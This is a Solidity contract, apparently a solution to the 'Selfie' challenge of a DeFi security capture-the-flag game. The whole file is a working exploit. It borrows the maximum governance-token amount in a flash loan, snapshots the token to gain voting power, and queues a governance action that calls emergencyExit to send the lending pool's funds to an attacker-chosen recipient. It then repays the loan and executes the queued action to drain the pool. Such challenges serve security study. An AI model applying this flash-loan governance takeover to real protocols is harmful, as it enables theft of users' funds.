// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";

interface ILoaner {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function maxFlashLoan(address _token) external view returns (uint256);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);

    // Slight abuse of interface
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract ExploitSelfie is IERC3156FlashBorrower {

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    address public dvToken;
    address public loaner;
    address public governance;
    address public recipient;

    constructor(address _dvToken, address _loaner, address _governance, address _recipient) {

        dvToken = _dvToken;
        loaner = _loaner;
        governance = _governance;
        recipient = _recipient;
    }

    function exploit() external {

        uint256 loanAmount = ILoaner(loaner).maxFlashLoan(dvToken);

        ILoaner(loaner).flashLoan(IERC3156FlashBorrower(this), dvToken, loanAmount, "");
    }

    function yoink() external {
        uint256 targetAction = ISimpleGovernance(governance).getActionCounter() - 1;
        ISimpleGovernance(governance).executeAction(targetAction);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {

        // Create action
        bytes memory action = abi.encodeWithSignature("emergencyExit(address)", recipient);

        // Need to take a snapshot before queuing
        IERC20(token).snapshot();

        // Queue action
        ISimpleGovernance(governance).queueAction(loaner, 0, action);

        // Give back loan
        IERC20(token).approve(msg.sender, amount);

        return CALLBACK_SUCCESS;
    }
}